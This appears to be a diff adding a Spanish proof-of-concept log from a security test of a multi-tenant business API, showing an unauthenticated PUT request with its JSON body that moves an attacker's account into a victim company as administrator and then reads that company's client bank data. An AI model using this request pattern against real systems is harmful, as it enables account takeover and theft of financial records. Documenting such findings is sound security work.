@@ -1,0 +1,10 @@
+1) Atacante registrado; su JWT revela empresaUsuarioId=10
+2) GET /empresas (sin token) lista 8 empresas; objetivo: id=7 'Victima QA 92f2bb'
+# 3) PUT /empresa-usuarios/{propio} SIN token -> empresa víctima, rol administrador
+> PUT /empresa-usuarios/10   [SIN token]
+  {"empresa_id": "7", "usuario_id": "12", "rol_id": 1}
+< HTTP 500  (13 ms)
+  {"error":"Error al actualizar vínculo","glosa":"null value in column \"usuario_id\" of relation \"auditoria\" violates not-null constraint"}
+4) Nuevo login del atacante: empresaId=7
+5) GET /clientes de la víctima -> HTTP 200: [('Cliente Confidencial 3cf52f', '76.543.210-3', 'Banco de Pruebas', '987654321098')]
+=> El atacante se convirtió en administrador de otra empresa y obtuvo sus datos bancarios
